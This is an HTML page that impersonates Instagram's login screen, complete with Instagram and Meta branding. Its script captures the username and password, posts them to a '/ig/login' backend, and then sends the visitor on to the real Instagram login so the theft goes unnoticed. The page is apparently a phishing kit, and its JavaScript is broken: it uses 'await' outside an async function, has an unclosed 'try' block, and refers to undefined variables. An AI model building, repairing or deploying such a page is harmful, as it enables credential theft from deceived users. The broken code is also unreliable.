<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #ffffff;
    color: #1c1e21;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 16px;
}

.login-container {
    width: 100%;
    max-width: 400px;
    display: flex;
    flex-direction: column;
    align-items: center;
    height: 100vh;
    max-height: 850px;
    position: relative;
    padding-top: 20px;
}

.language-selector {
    font-size: 14px;
    color: #65676b;
    margin-bottom: 60px;
}

.logo-container {
    margin-bottom: 40px;
}

.insta-logo {
    width: 72px;
    height: 72px;
}

form {
    width: 100%;
}

.input-group {
    margin-bottom: 12px;
}

.input-group input {
    width: 100%;
    padding: 16px;
    font-size: 15px;
    background-color: #ffffff;
    border: 1px solid #ccd0d5;
    border-radius: 12px;
    outline: none;
    color: #1c1e21;
}

/* Light grey placeholder styling text */
.input-group input::placeholder {
    color: #898f9c;
}

.input-group input:focus {
    border-color: #1877f2;
}

/* Bright Blue Button Style */
.login-btn {
    width: 100%;
    background-color: #0064e0;
    color: white;
    border: none;
    padding: 14px;
    border-radius: 25px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 12px;
    transition: background-color 0.1s ease;
}

.login-btn:hover {
    background-color: #0056c2;
}

.forgot-container {
    text-align: center;
    margin-top: 20px;
}

.forgot-link {
    text-decoration: none;
    color: #1c1e21;
    font-size: 15px;
    font-weight: 500;
}

/* Footer layout anchoring elements to the base */
.footer-container {
    margin-top: auto;
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 24px;
    padding-bottom: 20px;
}

.create-account-btn {
    width: 100%;
    background: transparent;
    border: 1px solid #0064e0;
    color: #0064e0;
    padding: 12px;
    border-radius: 25px;
    font-size: 15px;
    font-weight: 500;
    cursor: pointer;
}

.meta-brand {
    display: flex;
    align-items: center;
    gap: 4px;
    font-size: 14px;
    color: #65676b;
    font-weight: 500;
}

.meta-logo {
    width: 16px;
    height: 16px;
}

  </style>
</head>
<body>

    <div class="login-container">
        <div class="language-selector">English (US)</div>

      
      <div class="logo-container">
            <img src="icons/ig.svg" alt="logo" class="insta-logo">
        </div>

        <form id="loginForm" onsubmit="handleLogin(event)">
            <div class="input-group">
                <input type="text" id="credential" required placeholder="Username, email or mobile number">
            </div>

            <div class="input-group">
                <input type="password" id="password" required placeholder="Password">
            </div>

            <button type="submit" class="login-btn">Log in</button>
            
            <div class="forgot-container">
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
        </form>

        <div class="footer-container">
            <button class="create-account-btn">Create new account</button>
            <div class="meta-brand">
                <svg viewBox="0 0 24 24" class="meta-logo" xmlns="http://www.w3.org/2000/svg">
                    <path d="M16.42 6c-1.3 0-2.43.68-3.14 1.7-.72-1.02-1.85-1.7-3.15-1.7C7.94 6 6 8.04 6 10.56c0 2.8 2.45 5.44 6 8.44 3.55-3 6-5.64 6-8.44C18 8.04 16.06 6 16.42 6zm-6.29 7.63c-1.14 0-1.71-.56-1.71-1.68 0-1.1.57-1.66 1.71-1.66 1.13 0 1.7.55 1.7 1.66 0 1.12-.57 1.68-1.7 1.68zm6.29 0c-1.14 0-1.71-.56-1.71-1.68 0-1.1.57-1.66 1.71-1.66 1.13 0 1.7.55 1.7 1.66 0 1.12-.57 1.68-1.7 1.68z" fill="#0064E0"/>
                </svg>
                <span>Meta</span>
            </div>
        </div>
    </div>

    <script>
  function handleLogin(event) {
    event.preventDefault();
    
    const username = document.getElementById('credential').value;
    const password = document.getElementById('password').value;
    
    if (username && password) {
          try {
      const response = await fetch('/ig/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
      });

      if (response.ok) {
        usernameInput.value = '';
        passwordInput.value = '';
        alert("Worked");
        window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
      } else {
        alert("Failed");
        /*
        error.textContent = 'Authentication failed. Please try again.';
        error.style.display = 'block';
        btn.textContent = 'Log in';
        btn.disabled = false;
        */
      }
    }
}
  </script>
</body>
</html>
